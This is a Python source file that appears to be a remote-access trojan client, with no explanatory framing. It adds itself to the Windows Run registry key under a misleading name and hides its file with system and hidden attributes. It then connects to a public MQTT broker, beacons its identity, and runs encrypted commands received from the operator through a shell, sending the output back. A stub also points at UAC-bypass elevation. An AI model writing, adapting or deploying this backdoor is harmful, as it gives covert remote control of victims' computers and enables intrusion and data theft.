import paho.mqtt.client as mqtt_client
import socket
import os
import sys
import subprocess
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import json
import locale
import threading
import time

systype = ("windows" if os.name == "nt" else "unix")

def getpath():
    if getattr(sys, "frozen", False):
        application_path = sys.executable
    elif __file__:
        application_path = os.path.abspath(__file__)
    return application_path

def run_as_admin(cmd=""):
    function(uac=True, persist=False, elevate=False).run(id="13", payload=["C:\\windows\\system32\\cmd.exe", f'/c "{cmd}"'])

if systype == "windows":
    print(os.popen(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL non-auto setup" /d "{getpath()}" /f').read())
    print(os.system(f'attrib +s +h +a "{getpath()}"'))

os.chdir(os.path.expanduser("~"))
runpath_dict = {}
host = socket.gethostbyname(socket.gethostname())

client_id = f"{os.getpid()}@{socket.gethostname()}"
topic_list = {
    "stats":"/MQTT/stats", 
    "MQTT":"/MQTT", 
    "result":"/MQTT/result"
}
connected = False
donejob_list = []

key = b"replacewithlen16"
iv = b"replacewithlen16"

def gen_id():
    return hashlib.md5(str(time.time()).encode()).hexdigest()

def encrypt(plaintext:bytes, key=key, iv=iv):
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return ciphertext

def decrypt(ciphertext:bytes, key=key, iv=iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext
    except:
        return False

def mode_cmd(job_id, session_id, cmd):
    global client, donejob_list, runpath_dict

    if not job_id in donejob_list:
        cmd = cmd
        if cmd.lower() == "exit":
            p = subprocess.Popen(f"taskkill -F -PID {os.getpid()}" if os.name == "nt" else f"kill -9 {os.getpid()}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
        elif cmd.startswith("cd "):
            directory = cmd.split("cd ",1)[1]
            if directory:
                if directory[0] == directory[-1] == "%" and systype == "windows":
                    directory = os.environ.get(directory[1:-1], directory)
                elif directory[0] == "$" and systype != "windows":
                    directory = os.environ.get(directory[1:], directory)
                
                if directory[0] == directory[-1] == '"':
                    directory = directory[1:-1]

                if os.path.isdir(directory):
                    os.chdir(directory)
                    runpath_dict[session_id] = os.getcwd()
                elif os.path.isdir(os.path.join(runpath_dict[session_id], directory)):
                    os.chdir(os.path.join(runpath_dict[session_id], directory))
                    runpath_dict[session_id] = os.getcwd()

            if systype == "windows":
                cmd = "cd"
            else:
                cmd = "pwd"
        elif cmd.endswith(":"):
            if os.path.isdir(cmd):
                os.chdir(cmd)
                runpath_dict[session_id] = os.getcwd()
                if systype == "windows":
                        cmd = "cd"
                else:
                    cmd = "pwd"

        encoding = locale.getdefaultlocale()[1]
        p = subprocess.Popen(cmd, cwd=runpath_dict[session_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # getoutputs
        stdout, stderr = p.communicate()
        if p.returncode == 0:
            result = stdout.decode(encoding, errors="replace")
        else:
            result = "<stderr>" + stderr.decode(encoding, errors="replace")
        send(client, topic_list["result"], {"job_id":job_id, "result": result}, qos=2)
        donejob_list.append(job_id)
    else:
        send(client, topic_list["result"], {"job_id":job_id, "result":b"<stderr>\033[1;31mSame job id not accepted. "}, qos=2)

def on_connect(client, userdata, flags, rc):
    global connected
    connected = True
    print("Connected with result code: "+str(rc))
    client.subscribe(topic_list["MQTT"])

def on_disconnect(client, userdata, rc):
    global connected
    connected = False
    print("Disconnected with result code: "+str(rc))

def on_message(client, userdata, msg):
    try:
        global client_id, runpath_dict

        msg.payload = decrypt(msg.payload)
        if msg.payload:
            msg_json = json.loads(msg.payload)
            session_id = msg_json["session_id"]
            target = msg_json["target"]
            if target == client_id:
                mode = msg_json["mode"]
                if mode == "cmd":
                    job_id = msg_json["job_id"]
                    cmd = msg_json["cmd"]
                    if not session_id in list(runpath_dict):
                        runpath_dict[session_id] = os.path.expanduser("~")
                    run_thread = threading.Thread(target=mode_cmd, args=(job_id, session_id, cmd))
                    run_thread.start()
                else:
                    pass
    except Exception as err:
        pass

def send(client:mqtt_client.Client, topic, content:dict, qos=0):
    return client.publish(topic, encrypt(json.dumps(content).encode()), qos=qos)

client = mqtt_client.Client()
client.on_connect = on_connect
client.on_disconnect = on_disconnect
client.on_message = on_message

def upload_stats():
    while True:
        if connected:
            result, mid = send(client, topic_list["stats"], {"client_id":client_id})
            print(result, mid)
        time.sleep(0.5)

stats_thread = threading.Thread(target=upload_stats)
stats_thread.start()

while True:
    try:
        client.connect("public.mqtthq.com", 1883, 60)
        client.loop_start()
        break
    except Exception as e:
        print(f"Could not connect: {e}, retrying...")
        time.sleep(2)
